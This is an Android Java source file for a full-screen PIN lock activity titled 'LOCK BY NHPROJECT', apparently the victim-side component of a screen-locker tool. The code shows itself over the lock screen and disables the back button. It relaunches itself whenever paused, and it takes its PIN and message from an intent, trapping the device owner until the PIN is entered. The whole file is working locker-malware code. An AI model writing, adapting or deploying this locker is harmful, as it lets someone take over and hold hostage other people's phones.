package com.rei.target;
import android.app.Activity;
import android.content.Intent;
import android.os.*;
import android.view.WindowManager;
import android.widget.*;
public class LockActivity extends Activity {
    String pin = "666";
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        setContentView(R.layout.activity_lock);
        String p = getIntent().getStringExtra("pin"); if (p != null) pin = p;
        String t = getIntent().getStringExtra("text"); if (t == null) t = "LOCK BY NHPROJECT";
        ((TextView) findViewById(R.id.customText)).setText(t);
        getWindow().addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON | WindowManager.LayoutParams.FLAG_SHOW_WHEN_LOCKED | WindowManager.LayoutParams.FLAG_TURN_SCREEN_ON);
        if (Build.VERSION.SDK_INT >= 27) { setShowWhenLocked(true); setTurnScreenOn(true); }
        EditText pi = findViewById(R.id.pinInput);
        TextView ev = findViewById(R.id.errView);
        final String fpin = pin;
        findViewById(R.id.btnUnlock).setOnClickListener(v -> {
            if (pi.getText().toString().equals(fpin)) finish();
            else { ev.setText("PIN salah"); pi.setText(""); }
        });
    }
    public void onBackPressed() {}
    protected void onPause() {
        super.onPause();
        Intent i = new Intent(this, LockActivity.class);
        i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        i.putExtra("pin", pin);
        startActivity(i);
    }
}